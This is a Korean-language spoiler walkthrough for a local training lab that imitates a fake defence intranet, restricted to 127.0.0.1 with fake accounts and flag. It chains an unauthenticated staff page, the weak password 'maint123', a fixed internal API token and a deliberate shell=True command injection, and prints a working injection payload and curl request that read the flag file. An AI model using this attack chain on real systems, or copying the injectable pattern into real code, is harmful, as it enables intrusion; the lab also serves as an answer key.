# OpsWatch 풀이 (스포일러)

대상은 이 저장소의 **가상 국방망 인트라넷 교육 복제**만입니다.

- 베이스 URL: `http://127.0.0.1:8000`
- 모든 계정·토큰·FLAG는 가짜입니다.
- 실제 국방망, 다른 호스트, 공인 주소에 같은 요청을 보내지 마세요.

## 1. 유지보수 ID

브라우저에서 `http://127.0.0.1:8000/staff/` 를 엽니다. 인증이 없습니다.

야간유지보수 담당 박도윤의 **콘솔 ID**가 `maint` 로 나옵니다.

## 2. 약한 비밀번호

`http://127.0.0.1:8000/login/` 에서 ID `maint` 와 흔한 실습 비밀번호를 시도합니다.  
이 랩의 값은 `maint123` 입니다. 실패해도 계정이 잠기지 않습니다.

로그인 후 `/dashboard/` 에서 시드된 CPU·메모리 카드를 볼 수 있습니다.

## 3. 고정 토큰 발급

화면: `http://127.0.0.1:8000/support/`

**토큰 발급**을 누르면 서버가 내부 API 토큰을 돌려줍니다. 사용자별 발급·만료가 아니라 항상 같은 값입니다.

```
GET http://127.0.0.1:8000/api/internal/token/
```

```
{"token": "ow-lab-internal-9f3c2a1b7e44", "token_type": "internal", "expires_in": null}
```

이 토큰만 있으면 로그인 세션 없이 진단 API를 호출할 수 있습니다.

## 4. 토큰만으로 진단 API 호출

화면 `http://127.0.0.1:8000/admin/diagnostics/` 는 로그인이 필요합니다.  
API `POST /api/internal/diagnose/` 는 세션·CSRF 없이 헤더 토큰만 검사합니다.

- 헤더: `X-OpsWatch-Token: ow-lab-internal-9f3c2a1b7e44`
- 쿠키 없음, CSRF 없음

토큰이 없으면 403입니다.


정상 진단 예(컨테이너 내부 `extra_hosts` 기준):

대상 `web-01.lab.local` → `getent hosts` 결과.

호스트에서 Django를 직접 실행 중이면 셸이 꺼져 403이 납니다. Compose로 띄운 뒤에만 5단계가 됩니다.

## 5. 명령 결합으로 FLAG 읽기

의도적 취약점 위치: `inventory/services/diagnostics.py` 의 `build_lab_command()`.

```python
return f"/usr/bin/getent hosts {target}"
```

이 문자열이 `subprocess.run(..., shell=True)` 로 실행됩니다.

진단 대상 입력 예 (이 랩의 localhost 컨테이너 전용):

```
web-01.lab.local; cat /opt/challenge/flag.txt
```

결과는 HTML로 삽입되지 않고 `<pre>` 의 `textContent` 로만 표시됩니다.  
성공 시 출력에 다음 가짜 FLAG가 포함됩니다.

```
FLAG{OPSWATCH_LAB_CMDI_LOCAL_ONLY}
```

세션 없이 토큰만으로 호출하는 예입니다. `127.0.0.1` 전용입니다.

```powershell
curl.exe -s -X POST "http://127.0.0.1:8000/api/internal/diagnose/" `
  -H "Content-Type: application/json" `
  -H "X-OpsWatch-Token: ow-lab-internal-9f3c2a1b7e44" `
  --data "{\"target\":\"web-01.lab.local; cat /opt/challenge/flag.txt\"}"
```
